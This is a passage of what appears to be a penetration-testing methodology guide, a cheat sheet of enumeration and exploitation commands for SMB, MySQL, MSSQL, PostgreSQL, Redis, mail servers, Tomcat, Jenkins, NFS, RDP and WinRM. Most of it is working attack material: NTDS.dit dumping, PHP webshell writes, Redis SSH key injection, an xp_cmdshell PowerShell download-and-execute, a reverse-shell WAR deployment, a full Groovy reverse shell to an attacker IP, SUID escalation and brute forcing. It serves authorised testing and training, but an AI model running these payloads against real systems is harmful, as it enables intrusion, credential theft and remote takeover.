netexec smb <IP> -u admin -p password --users
netexec smb <IP> -u admin -p password --groups
netexec smb <IP> -u admin -p password --pass-pol
netexec smb <IP> -u admin -p password -x 'whoami'  # Execute command
netexec smb <IP> -u admin -p password -M spider_plus  # Spider shares
netexec smb <IP> -u admin -p password --ntds  # Dump NTDS.dit

# Check for vulnerabilities with Nmap
nmap --script smb-vuln* <IP> -p 445
nmap --script smb-protocols,smb-security-mode,smb-enum-shares,smb-enum-users <IP>

# Specific vulnerability checks
nmap --script smb-vuln-ms17-010 <IP>  # EternalBlue
nmap --script smb-vuln-ms08-067 <IP>  # MS08-067
nmap --script smb-vuln-cve-2017-7494 <IP>  # SambaCry
nmap --script smb-vuln-ms10-061 <IP>  # MS10-061

# RPC enumeration
rpcclient -U "" -N <IP>
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> queryuser 0x1f4
rpcclient> getdompwinfo
rpcclient> querydispinfo
rpcclient> netshareenumall

# Impacket tools
impacket-smbclient username:password@<IP>
impacket-lookupsid username:password@<IP>
```

**Common SMB Vulnerabilities to Check:**

- ‚úÖ Null session authentication
- ‚úÖ Anonymous/guest access to shares
- ‚úÖ MS17-010 (EternalBlue) - Windows SMBv1 RCE
- ‚úÖ MS08-067 - Windows Server Service RCE
- ‚úÖ CVE-2017-7494 (SambaCry) - Samba RCE
- ‚úÖ Writable shares (potential upload location)
- ‚úÖ Sensitive files exposed in shares
- ‚úÖ Weak/default credentials
- ‚úÖ SMB signing disabled

### 2.5.4 üóÑÔ∏è Database Services

#### MySQL/MariaDB (Port 3306)

```bash
# Nmap scripts for MySQL
nmap --script mysql-info,mysql-empty-password,mysql-users,mysql-databases,mysql-variables <IP> -p 3306
nmap --script mysql-enum <IP> -p 3306
nmap --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt <IP> -p 3306

# Connect to MySQL
mysql -h <IP> -u root -p
mysql -h <IP> -u root  # Try without password

# Common default credentials
mysql -h <IP> -u root -p  # password: root, toor, password, mysql, [empty]
mysql -h <IP> -u admin -p  # password: admin, password

# Basic commands once connected
SHOW DATABASES;
USE database_name;
SHOW TABLES;
SELECT * FROM users;
SELECT user,password FROM mysql.user;
SELECT user,authentication_string FROM mysql.user;

# Read files (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');

# Write files (requires FILE privilege and secure_file_priv)
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/shell.php";

# Check privileges
SHOW GRANTS;
SELECT user,host FROM mysql.user WHERE Super_priv='Y';

# UDF privilege escalation (if root access)
# Use lib_mysqludf_sys library for system command execution
```

#### MSSQL (Port 1433)

```bash
# Nmap scripts
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info,ms-sql-config <IP> -p 1433
nmap --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt <IP> -p 1433

# NetExec for MSSQL
netexec mssql <IP> -u sa -p ''  # Empty password
netexec mssql <IP> -u sa -p password --local-auth
netexec mssql <IP> -u admin -p password -x "whoami"  # Execute command
netexec mssql <IP> -u sa -p password -q "SELECT @@version"  # Execute query

# Impacket mssqlclient
impacket-mssqlclient sa:password@<IP> -windows-auth
impacket-mssqlclient username:password@<IP>

# Once connected - basic queries
SELECT @@version;
SELECT name FROM master.dbo.sysdatabases;
EXEC sp_databases;
SELECT * FROM information_schema.tables;

# Enable xp_cmdshell (requires sysadmin role)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Execute OS commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).downloadString(''http://10.10.14.5/shell.ps1'')"';

# Read files
EXEC xp_cmdshell 'type C:\Windows\System32\drivers\etc\hosts';

# OPENROWSET for file read (may require specific permissions)
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x;

# Check current user and roles
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
```

#### PostgreSQL (Port 5432)

```bash
# Connect to PostgreSQL
psql -h <IP> -U postgres
psql -h <IP> -U postgres -d database_name

# Default credentials to try
# Username: postgres, Password: postgres, password, [empty]

# Nmap scripts
nmap --script pgsql-brute --script-args userdb=users.txt,passdb=passwords.txt <IP> -p 5432

# Basic commands
\l  # List databases
\c database_name  # Connect to database
\dt  # List tables
\du  # List users/roles
\dg  # List groups

# SQL queries
SELECT version();
SELECT current_database();
SELECT current_user;
SELECT * FROM pg_user;
SELECT * FROM pg_shadow;  # Password hashes (requires superuser)

# Read files (requires superuser)
SELECT pg_read_file('/etc/passwd', 0, 1000000);
CREATE TABLE temp(data text);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp;

# Command execution (requires superuser)
COPY (SELECT '') TO PROGRAM 'id';
CREATE TABLE cmd(output text);
COPY cmd FROM PROGRAM 'id';
SELECT * FROM cmd;

# Write files
COPY (SELECT 'test') TO '/tmp/test.txt';
```

#### Redis (Port 6379)

```bash
# Connect to Redis
redis-cli -h <IP>
redis-cli -h <IP> -a password  # With password

# Using netcat
nc <IP> 6379

# Common commands
INFO
CONFIG GET *
KEYS *
GET key_name
SET key_name value

# Check authentication
AUTH password

# Nmap script
nmap --script redis-info <IP> -p 6379

# Enumerate all keys and values
redis-cli -h <IP> --scan
redis-cli -h <IP> KEYS "*"

# Write webshell (if writable web directory)
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET cmd "<?php system($_GET['cmd']); ?>"
SAVE

# SSH key injection (if home directory writable)
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET key "\n\n\nssh-rsa YOUR_PUBLIC_KEY\n\n\n"
SAVE
```

#### MongoDB (Port 27017)

```bash
# Connect to MongoDB
mongo <IP>
mongo <IP>:27017
mongo <IP>/database_name

# With authentication
mongo -u username -p password <IP>/admin

# Basic commands
show dbs
use database_name
show collections
db.collection_name.find()
db.collection_name.find().pretty()

# Enumerate users
use admin
db.system.users.find()

# Nmap scripts
nmap --script mongodb-info,mongodb-databases <IP> -p 27017
```

### 2.5.5 üìß Email Services

#### SMTP (Port 25, 587, 465)

```bash
# Banner grabbing
nc -nv <IP> 25
telnet <IP> 25

# SMTP commands
HELO attacker.com
EHLO attacker.com
HELP
VRFY root
VRFY admin
EXPN root

# User enumeration
smtp-user-enum -M VRFY -U users.txt -t <IP>
smtp-user-enum -M EXPN -U users.txt -t <IP>
smtp-user-enum -M RCPT -U users.txt -t <IP> -D example.com

# Nmap scripts
nmap --script smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln-cve2010-4344 <IP> -p 25
nmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} <IP> -p 25

# Send test email
telnet <IP> 25
HELO attacker.com
MAIL FROM: test@attacker.com
RCPT TO: user@<IP>
DATA
Subject: Test Email

This is a test.
.
QUIT

# Test open relay
swaks --to user@external.com --from sender@<IP> --server <IP>
```

#### POP3 (Port 110, 995)

```bash
# Connect to POP3
telnet <IP> 110
nc -nv <IP> 110

# POP3 commands
USER username
PASS password
LIST  # List messages
RETR 1  # Retrieve message 1
DELE 1  # Delete message 1
QUIT

# Nmap scripts
nmap --script pop3-capabilities,pop3-brute <IP> -p 110

# Brute force
hydra -l user -P /usr/share/wordlists/rockyou.txt pop3://<IP>
```

#### IMAP (Port 143, 993)

```bash
# Connect to IMAP
telnet <IP> 143
nc -nv <IP> 143

# IMAP commands
a1 LOGIN username password
a2 LIST "" "*"
a3 SELECT INBOX
a4 FETCH 1 BODY[]
a5 LOGOUT

# Nmap scripts
nmap --script imap-capabilities,imap-brute <IP> -p 143

# Brute force
hydra -l user -P /usr/share/wordlists/rockyou.txt imap://<IP>
```

## 2.5.6 üåê Web Server Specific

#### Apache Tomcat (Port 8080, 8443)

```bash
# Nmap scripts for Tomcat
nmap --script http-tomcat-manager-brute <IP> -p 8080
nmap --script http-tomcat-manager-brute --script-args "userdb=users.txt,passdb=passwords.txt" <IP> -p 8080

# Metasploit auxiliary scanner
use auxiliary/scanner/http/tomcat_mgr_login

# Deploy WAR shell via manager (if credentials obtained)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war > shell.war
curl -u tomcat:tomcat --upload-file shell.war "http://<IP>:8080/manager/text/deploy?path=/shell"

# Access deployed shell
curl http://<IP>:8080/shell/

# Manual WAR deployment via manager
# 1. Navigate to /manager/html
# 2. Login with credentials
# 3. Upload WAR file in "WAR file to deploy" section
# 4. Access at /shell_name/

# CVE checks for Tomcat
searchsploit tomcat
nmap --script http-vuln-cve2017-12615 <IP> -p 8080  # PUT method RCE
```

#### JBoss/WildFly (Port 8080, 9990)

```bash
# Common paths
curl http://<IP>:8080/
curl http://<IP>:8080/admin-console
curl http://<IP>:8080/jmx-console
curl http://<IP>:8080/invoker/JMXInvokerServlet
curl http://<IP>:8080/web-console
curl http://<IP>:9990/console

# Check for unauthenticated JMX console
curl http://<IP>:8080/jmx-console/

# Default credentials
admin:admin
admin:password

# JBoss exploitation tools
jexboss -u http://<IP>:8080
```

#### Jenkins (Port 8080)

```bash
# Common paths
curl http://<IP>:8080/
curl http://<IP>:8080/script  # Groovy script console
curl http://<IP>:8080/manage
curl http://<IP>:8080/asynchPeople/
curl http://<IP>:8080/systemInfo

# Default credentials
admin:admin
admin:password

# Groovy reverse shell (if script console accessible)
String host="10.10.14.5";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();

# Windows Groovy reverse shell
def cmd = "cmd.exe /c powershell -e BASE64_ENCODED_PAYLOAD"
cmd.execute()
```

### 2.5.7 üîå Network Services

#### SNMP (Port 161/UDP)

```bash
# Enumerate with default community strings
snmpwalk -v1 -c public <IP>
snmpwalk -v2c -c public <IP>
snmpwalk -v2c -c private <IP>

# Full enumeration
snmpwalk -v2c -c public <IP> .1
snmpwalk -v2c -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendObjects

# Enumerate specific OIDs
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.1.6.0  # System processes
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25  # User accounts

# Brute force community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP> snmp

# Nmap scripts
nmap -sU --script snmp-info,snmp-brute,snmp-interfaces,snmp-processes,snmp-sysdescr <IP> -p 161
```

#### NFS (Port 2049)

```bash
# Show exported shares
showmount -e <IP>
showmount -a <IP>

# Mount NFS share
mkdir /tmp/nfs
mount -t nfs <IP>:/share /tmp/nfs
mount -t nfs -o vers=3 <IP>:/share /tmp/nfs

# Nmap scripts
nmap --script nfs-ls,nfs-showmount,nfs-statfs <IP> -p 2049

# Check for no_root_squash (allows root access)
cat /etc/exports  # On target if accessible

# Exploit no_root_squash
# 1. Mount share
# 2. Create SUID binary as root
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash
# 3. On target: /share/bash -p
```

#### RDP (Port 3389)

```bash
# Nmap scripts
nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 <IP> -p 3389

# Connect with rdesktop
rdesktop <IP>
rdesktop -u admin -p password <IP>

# Connect with xfreerdp
xfreerdp /u:admin /p:password /v:<IP>
xfreerdp /u:admin /p:password /v:<IP> /cert:ignore

# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://<IP> -t 4
netexec rdp <IP> -u admin -p passwords.txt

# BlueKeep vulnerability (CVE-2019-0708)
nmap --script rdp-vuln-ms12-020 <IP> -p 3389
```

#### LDAP (Port 389, 636)

```bash
# Anonymous bind enumeration
ldapsearch -x -H ldap://<IP> -b "dc=example,dc=com"
ldapsearch -x -H ldap://<IP> -s base namingcontexts

# Enumerate users
ldapsearch -x -H ldap://<IP> -b "dc=example,dc=com" "(objectClass=user)"
ldapsearch -x -H ldap://<IP> -b "dc=example,dc=com" "(&(objectClass=user)(sAMAccountName=*))"

# With credentials
ldapsearch -x -H ldap://<IP> -D "cn=admin,dc=example,dc=com" -w password -b "dc=example,dc=com"

# Nmap scripts
nmap --script ldap-rootdse,ldap-search <IP> -p 389
```

#### WinRM (Port 5985, 5986)

```bash
# Evil-WinRM connection
evil-winrm -i <IP> -u admin -p password
evil-winrm -i <IP> -u admin -H NTLM_HASH

# NetExec
netexec winrm <IP> -u admin -p password
netexec winrm <IP> -u admin -p password -x "whoami"

# Test authentication
Test-WSMan -ComputerName <IP>
```

---

## 2.6 Building the Exploitation Plan

### 2.6.1 üìä Vulnerability Prioritization Matrix

| Priority | Criteria | Examples |
|----------|----------|----------|
| **P1 - Critical** | Direct RCE, Unauthenticated access | EternalBlue, Log4Shell, Unauthenticated file upload |
| **P2 - High** | Auth bypass, Privilege escalation, SQLi with data access | Authentication bypass, UNION SQLi, SSTI |
| **P3 - Medium** | Requires interaction, Limited impact | Stored XSS, CSRF, Information disclosure |
| **P4 - Low** | Theoretical, Difficult to exploit | Reflected XSS (no cookies), Missing headers |

### 2.6.2 üìù Vulnerability Documentation Template

```markdown
## Vulnerability: [Name]

**Host/URL:** [Target]
**Service/Port:** [Service details]
**Severity:** [Critical/High/Medium/Low]

### Description
[What the vulnerability is and why it matters]

### Evidence
[Screenshots, responses, error messages]

### Reproduction Steps
1. [Step-by-step instructions]
2. [Include exact commands/payloads]
3. [Expected vs actual results]

### Impact
[What an attacker could achieve]

### References
- [CVE numbers]
- [PayloadsAllTheThings links]
- [Exploit-DB links]

### Exploitation Notes
[Payload used, modifications needed, gotchas]
```

### 2.6.3 üéØ Attack Chain Planning

```markdown
## Primary Attack Path
1. [Initial access vector] ‚Üí [foothold method]
2. [Privilege escalation opportunity]
3. [Persistence/lateral movement if applicable]

## Backup Attack Paths
- Path B: [Alternative if primary fails]
- Path C: [Third option]

## Required Tools/Payloads
- [ ] Reverse shell payload for [OS/language]
- [ ] Exploit script for [CVE]
- [ ] Wordlist for [service]

## Pre-Exploitation Setup
- [ ] Listener ready on port [X]
- [ ] Web server for payload delivery
- [ ] Exploit dependencies installed
```



